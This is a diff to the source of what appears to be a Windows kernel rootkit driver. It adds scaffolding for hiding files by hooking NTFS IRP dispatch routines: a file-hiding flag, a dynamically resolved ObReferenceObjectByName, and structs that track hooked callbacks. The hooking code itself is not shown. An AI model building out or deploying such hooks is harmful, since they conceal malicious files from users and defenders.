@@ -109,6 +109,7 @@
 #define MAX_REG_ITEMS 256
 #define REG_VALUE_LEN 260
 #define REG_KEY_LEN 255
+#define SUPPORTED_HOOKED_NTFS_CALLBACKS 1
 
 // Prototypes.
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
@@ -135,10 +136,19 @@ typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(
 typedef PPEB(NTAPI* tPsGetProcessPeb)(
 	PEPROCESS Process);
 
-typedef NTSTATUS(NTAPI* tIoCreateDriver)(
-	PUNICODE_STRING DriverName,
-	PDRIVER_INITIALIZE InitializationFunction
-	);
+typedef NTSTATUS (NTAPI* tObReferenceObjectByName)(
+	PUNICODE_STRING ObjectName,
+	ULONG Attributes,
+	PACCESS_STATE AccessState,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_TYPE ObjectType,
+	KPROCESSOR_MODE AccessMode,
+	PVOID ParseContext,
+	PVOID* Object);
+
+typedef NTSTATUS(NTAPI* tNtfsIrpFunction)(
+	PDEVICE_OBJECT DeviceObject,
+	PIRP Irp);
 
 // Globals.
 PVOID RegistrationHandle = NULL;
@@ -150,14 +160,16 @@ struct EnabledFeatures {
 	bool RegistryFeatures	= true;
 	bool ProcessProtection	= true;
 	bool FileProtection		= true;
+	bool FileHiding			= true;
 };
 EnabledFeatures Features;
 
 // --- ModuleUtils structs ----------------------------------------------------
 struct DynamicImportedModulesGlobal {
-	tZwProtectVirtualMemory ZwProtectVirtualMemory;
-	tMmCopyVirtualMemory	MmCopyVirtualMemory;
-	tPsGetProcessPeb		PsGetProcessPeb;
+	tObReferenceObjectByName ObReferenceObjectByName;
+	tZwProtectVirtualMemory  ZwProtectVirtualMemory;
+	tMmCopyVirtualMemory	 MmCopyVirtualMemory;
+	tPsGetProcessPeb		 PsGetProcessPeb;
 
 	void Init() {
 		UNICODE_STRING routineName;
@@ -167,6 +179,8 @@ struct DynamicImportedModulesGlobal {
 		MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
 		RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
 		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"ObReferenceObjectByName");
+		ObReferenceObjectByName = (tObReferenceObjectByName)MmGetSystemRoutineAddress(&routineName);
 	}
 };
 DynamicImportedModulesGlobal dimGlobals;
@@ -252,12 +266,22 @@ struct FilesList {
 	WCHAR* FilesPath[MAX_FILES];
 };
 
+struct NtfsCallback {
+	PVOID Address;
+	bool Activated;
+};
+
 struct FileGlobals {
 	FilesList Files;
 	FastMutex Lock;
+	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];
 
 	void Init() {
 		Files.FilesCount = 0;
+
+		for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
+			Callbacks[i].Activated = false;
+
 		Lock.Init();
 	}
 };
